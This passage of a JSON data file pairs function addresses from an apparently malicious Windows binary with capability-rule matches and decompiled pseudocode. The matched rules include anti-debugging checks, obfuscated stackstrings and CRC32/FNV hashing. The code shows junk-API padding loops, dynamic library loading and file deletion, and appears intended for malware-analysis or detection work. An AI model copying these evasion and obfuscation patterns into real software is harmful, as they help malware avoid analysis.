iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x00411479:\n    var_20h = iVar12 << (0x1fU - str.5_v_[1] & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3662
    },
    "004114bc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004114bc(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x004119bd;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x4294e0 - 1;\n        iVar4 = *0x4294e0 + (*0x4294e0 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x4294e0 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x004115f1;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x004115f8;\ncode_r0x004115f1:\n                        do {\n                            var_4h = 1;\ncode_r0x004115f8:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x00411606;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x00411606:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x4294dc - *0x4294e0) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x4294dc < iVar12) {\n                if (iVar12 < *0x4294d8) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x4294ec;\n                    iVar4 = *0x4294e4 + (*0x4294e4 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x4294e4 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x4294e4 + (*0x4294e4 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x4294e4 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x4294ec + *0x4294d8;\n                    uVar5 = 1;\n                }\n                goto code_r0x004119bd;\n            }\n            var_10h = *0x4294dc - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x4294e0 - 1;\n            iVar12 = *0x4294e0 + (*0x4294e0 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x4294e0 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x004117a9;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x004117a9:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x4294e4 + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x004119bd:\n    var_20h = iVar12 << (0x1fU - *0x4294e4 & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x4294e8 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x4294e8 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3653
    },
    "0040f2d4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040f2d4(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00408664(0x416c40, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.004065c7();\n        *puVar2 = 0;\n        puVar2 = fcn.004065b4();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x443c10)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x443c20;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.004134d9(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.004065b4();\n                    *puVar2 = 9;\n                    puVar2 = fcn.004065c7();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0040eba1(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0040f3a6(0x416c40);\n                goto code_r0x0040f3a0;\n            }\n        }\n        puVar2 = fcn.004065c7();\n        *puVar2 = 0;\n        puVar2 = fcn.004065b4();\n        *puVar2 = 9;\n        fcn.0040654c(0, 0, 0, 0, 0);\n    }\ncode_r0x0040f3a0:\n    fcn.004086a9();\n    return;\n}\n",
        "token_count": 639
    },
    "00404592": {
        "rules": [
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004",
            "contain obfuscated stackstrings",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404592(uint32_t *param_1, uint32_t param_2)\n\n{\n    *param_1 = *param_1 ^ param_2;\n    return;\n}\n",
        "token_count": 43
    },
    "00404c21": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404c21(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    *arg_8h = *arg_8h + arg_ch;\n    return;\n}\n",
        "token_count": 47
    },
    "00404e1a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404e1a(void)\n\n{\n    *0x442800 = *0x442800 + 0x38b5;\n    return;\n}\n",
        "token_count": 37
    },
    "004052eb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004052eb(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t arg_8h;\n    uint lpszVolumeName;\n    uint lpString1;\n    uint ContextRecord;\n    uint lpFindFileData;\n    uint lpVersionInformation;\n    uint var_70h;\n    uint var_50h;\n    uint hEvent;\n    uint lpLastWriteTime;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint var_18h;\n    uint lpNumberOfFreeClusters;\n    uint lpNumberOfEventsWritten;\n    uint lpTotalNumberOfClusters;\n    uint lpBytesPerSector;\n    uint lpSectorsPerCluster;\n    \n    iVar3 = 0;\n    do {\n        if (iVar3 == 0x13e6) {\n            *0x442c54 = *0x442c54 + 0x38d6;\n        }\n        if (*0x442c54 == 0xbd8) {\n            (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0x401360);\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x31a652);\n    fcn.004052d7();\n    arg_8h = 0;\n    if (*0x442c54 != 0) {\n        do {\n            fcn.00404d76(arg_8h);\n            if (*0x442c54 == 0x29) {\n                (*_sym.imp.KERNEL32.dll_MoveFileWithProgressA)(0x4013b0, 0x40138c, 0, 0, 0);\n                (*_sym.imp.KERNEL32.dll_InterlockedExchangeAdd)(0, 0);\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h < *0x442c54);\n    }\n    iVar3 = 0x962be2;\n    do {\n        if (*0x442c54 == 0x481) {\n            (*_sym.imp.KERNEL32.dll_SetErrorMode)(0);\n            (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsA)(0);\n            (*_sym.imp.KERNEL32.dll_FindFirstFileW)(0, 0);\n        }\n        if (*0x442c54 == 0x721) {\n            (*_sym.imp.KERNEL32.dll_lstrcatA)(&lpString1, 0x4013d0);\n            (*_sym.imp.KERNEL32.dll_GetFileTime)(0, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n            (*_sym.imp.KERNEL32.dll_InterlockedCompareExchange)(&var_18h, 0, 0);\n            (*_sym.imp.KERNEL32.dll_RtlCaptureContext)(&ContextRecord);\n            (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n            (*_sym.imp.KERNEL32.dll_TerminateThread)(0, 0);\n            (*_sym.imp.KERNEL32.dll_WriteConsoleInputA)(0, 0, 0, &lpNumberOfEventsWritten);\n            (*_sym.imp.KERNEL32.dll_CreateMailslotA)(0x4013f4, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_MoveFileExA)(0x401460, 0x401430, 0);\n            (*_sym.imp.KERNEL32.dll_SetEvent)(&hEvent);\n            (*_sym.imp.KERNEL32.dll_GetLogicalDriveStringsA)(0, &lpszVolumeName);\n            (*_sym.imp.KERNEL32.dll_MoveFileW)(0, 0);\n            (*_sym.imp.KERNEL32.dll_GetDiskFreeSpaceA)\n                      (0, &lpSectorsPerCluster, &lpBytesPerSector, &lpNumberOfFreeClusters, &lpTotalNumberOfClusters);\n            (*_sym.imp.KERNEL32.dll_GetCurrentActCtx)(0);\n            (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_VerSetConditionMask)(0, 0, 0, 0);\n        }\n        pcVar2 = _sym.imp.KERNEL32.dll_CopyFileW;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    if (*0x442c54 == 0x19c) {\n        (*_sym.imp.KERNEL32.dll_CopyFileW)(0, 0, 0);\n        pcVar1 = _sym.imp.KERNEL32.dll_CreateActCtxW;\n        (*_sym.imp.KERNEL32.dll_CreateActCtxW)(&var_50h);\n        (*_sym.imp.KERNEL32.dll_UpdateResourceA)(0, 0, 0, 0, 0, 0);\n        (*pcVar1)(&var_70h);\n        (*_sym.imp.KERNEL32.dll__llseek)(0, 0, 0);\n        (*pcVar2)(0, 0, 0);\n    }\n    iVar3 = 0;\n    do {\n        if (iVar3 == 0xab9d) {\n            *0x442c50 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x429a08);\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x2594b);\n    *0x429a08 = 0;\n    iVar3 = 0;\n    do {\n        if (iVar3 == 0x148) {\n            fcn.00404e28();\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x427fa7);\n    fcn.00404d2a(*0x442800, *0x442c54, 0x418010);\n    iVar3 = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_GlobalFlags)(0);\n        if (iVar3 == 0x2f7e4) {\n            fcn.00404e1a();\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x48122);\n    fcn.004044f6();\n    if (*0x442c54 == 0x58c) {\n        (*_sym.imp.KERNEL32.dll_LocalShrink)(0, 0);\n        (*_sym.imp.KERNEL32.dll_FindFirstVolumeA)(&lpszVolumeName, 0);\n        (*_sym.imp.KERNEL32.dll_FindNextFileW)(0, &lpFindFileData);\n        (*_sym.imp.KERNEL32.dll_EndUpdateResourceA)(0, 0);\n        (*_sym.imp.KERNEL32.dll_SetProcessPriorityBoost)(0, 0);\n        (*_sym.imp.KERNEL32.dll_VerifyVersionInfoA)(&lpVersionInformation, 0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_SearchPathA)(0, 0, 0, 0, &lpString1, &lpSectorsPerCluster);\n        (*_sym.imp.KERNEL32.dll_GetBinaryTypeA)(0, &lpBytesPerSector);\n    }\n    fcn.00404e13();\n    return 0;\n}\n",
        "token_count": 1565
    },
    "004056cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004056cf(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    fcn.004044be(param_1, param_2, param_3, param_4);\n    return;\n}\n",
        "token_count": 56
    },
    "00405cc2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405cc2(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00407e04();\n    fcn.00407f8a(1, iVar1 + 0x20);\n    return;\n}\n",
        "token_count": 56
    },
    "00405d10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00405d10(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00408664(0x4169e0, 0xc);\n    if (*(unaff_EBP + 0xc) == 0) {\n        puVar1 = fcn.004065b4();\n        *puVar1 = 0x16;\n        fcn.0040654c(0, 0, 0, 0, 0);\n    }\n    else {\n        uVar2 = fcn.00407e04();\n        fcn.00407f1c(0, uVar2);\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.00407e04(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n        uVar2 = (**(unaff_EBP + 8))(uVar2);\n        *(unaff_EBP + -0x1c) = uVar2;\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.00405d87();\n    }\n    fcn.004086a9();\n    return;\n}\n",
        "token_count": 339
    },
    "00405d96": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405d96(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00405d10(fcn.00408916, arg_8h, 0, &arg_ch);\n    return;\n}\n",
        "token_count": 53
    },
    "00405db3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00405db3(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint arg_10h;\n    uint var_4h;\n    \n    fcn.00408664(0x416a00, 0xc);\n    if (*(unaff_EBP + 8) == 0) {\n        puVar1 = fcn.004065b4();\n        *puVar1 = 0x16;\n        fcn.0040654c(0, 0, 0, 0, 0);\n    }\n    else {\n        iVar2 = fcn.00407e04();\n        fcn.00407f1c(1, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0;\n        iVar2 = fcn.00407e04();\n        arg_8h_00 = fcn.00407fb9(iVar2 + 0x20);\n        iVar2 = unaff_EBP + 0xc;\n        arg_10h = 0;\n        uVar4 = *(unaff_EBP + 8);\n        iVar3 = fcn.00407e04();\n        uVar4 = fcn.00409979(iVar3 + 0x20, uVar4, arg_10h, iVar2);\n        *(unaff_EBP + -0x1c) = uVar4;\n        iVar2 = fcn.00407e04();\n        fcn.00408055(arg_8h_00, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.00405e4f();\n    }\n    fcn.004086a9();\n    return;\n}\n",
        "token_count": 462
    },
    "00405e4f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405e4f(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00407e04();\n    fcn.00407f8a(1, iVar1 + 0x20);\n    return;\n}\n",
        "token_count": 57
    },
    "00407897": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00407897(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    float10 in_ST0;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    \n    fcn.0040cee3();\n    return in_ST0;\n}\n",
        "token_count": 88
    },
    "0040a801": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a801(uint arg_8h)\n\n{\n    fcn.0040a6d5(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 43
    },
    "0040af5e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040af72)\n// WARNING: Removing unreachable block (ram,0x0040af78)\n// WARNING: Removing unreachable block (ram,0x0040af7a)\n\nvoid fcn.0040af5e(void)\n\n{\n    return;\n}\n",
        "token_count": 66
    },
    "0041481a": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0041481a(void)\n\n{\n    *0x429980 = (*_sym.imp.KERNEL32.dll_CreateFileA)(0x404394, 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 62
    },
    "00404d76": {
        "rules": [
            "print debug messages",
            "delete directory",
            "create directory",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpNumberOfEventsRead\n\nvoid __cdecl fcn.00404d76(int32_t arg_8h)\n\n{\n    uint var_1818h;\n    uint var_1018h;\n    uint lpBuffer;\n    uint uStack84;\n    uint uStack80;\n    uint *puStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint *puStack44;\n    uint uStack40;\n    uint *puStack36;\n    uint uStack32;\n    uint *var_18h;\n    uint *puStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint lpNumberOfEventsRead;\n    \n    lpNumberOfEventsRead = 0x404d83;\n    fcn.00405b00();\n    if (*0x442c54 == 0x37) {\n        uStack12 = 0x401250;\n        uStack16 = 0x404d98;\n        (*_sym.imp.KERNEL32.dll_OutputDebugStringA)();\n        uStack16 = 0;\n        uStack20 = 0x404da1;\n        (*_sym.imp.KERNEL32.dll_RemoveDirectoryW)();\n        uStack20 = 0;\n        puStack24 = &fcn.00404d76::lpBuffer;\n        var_18h = 0x404daf;\n        (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)();\n        var_18h = &fcn.00404d76::var_1018h;\n        uStack32 = 0;\n        puStack36 = 0x404dbd;\n        (*_sym.imp.KERNEL32.dll_GetTempPathW)();\n        puStack36 = &fcn.00404d76::lpNumberOfEventsRead;\n        uStack40 = 0;\n        puStack44 = &fcn.00404d76::var_18h;\n        uStack48 = 0;\n        uStack52 = 0x404dcd;\n        (*_sym.imp.KERNEL32.dll_ReadConsoleInputW)();\n        uStack52 = 0;\n        uStack56 = 0x401278;\n        uStack60 = 0x4012d8;\n        uStack64 = 0x404dde;\n        (*_sym.imp.KERNEL32.dll_CreateDirectoryExW)();\n        uStack64 = 0;\n        uStack68 = 0x404de5;\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n        uStack68 = 0;\n        uStack72 = 0;\n        puStack76 = &fcn.00404d76::var_1818h;\n        uStack80 = 0;\n        uStack84 = 0x404df5;\n        (*_sym.imp.KERNEL32.dll_GetConsoleAliasW)();\n    }\n    *(*0x442800 + arg_8h) = *(*0x443068 + 0x38d6 + arg_8h);\n    return;\n}\n",
        "token_count": 671
    },
    "00405cd5": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405cd5(uint lpFileName)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_DeleteFileA)(lpFileName);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        iVar1 = 0;\n    }\n    if (iVar1 != 0) {\n        fcn.004065da(iVar1);\n        return 0xffffffff;\n    }\n    return 0;\n}\n",
        "token_count": 117
    },
    "00405d05": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint fcn.00405d05(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_DeleteFileA)(param_1);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        iVar1 = 0;\n    }\n    if (iVar1 != 0) {\n        fcn.004065da(iVar1);\n        return 0xffffffff;\n    }\n    return 0;\n}\n",
        "token_count": 117
    }
}